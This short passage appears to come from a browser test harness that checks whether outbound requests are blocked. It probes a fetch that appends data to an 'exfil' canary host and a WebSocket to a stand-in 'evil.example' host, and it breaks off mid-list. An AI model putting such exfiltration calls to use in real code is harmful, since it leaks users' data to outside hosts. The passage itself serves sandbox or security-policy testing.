rtDone([
  rt('fetch https://exfil.glyphsweep-canary.net/c (no-cors)', () => fetch('https://exfil.glyphsweep-canary.net/c?' + c, { mode: 'no-cors' }).then((r) => 'opaque ' + r.type)),

  rt('WebSocket wss://evil.example/ws', () => new Promise((ok, bad) => { const w = new WebSocket('wss://evil.example/ws'); w.onopen = () => ok('open'); w.onerror = () => bad(new Error('websocket refused')); })),
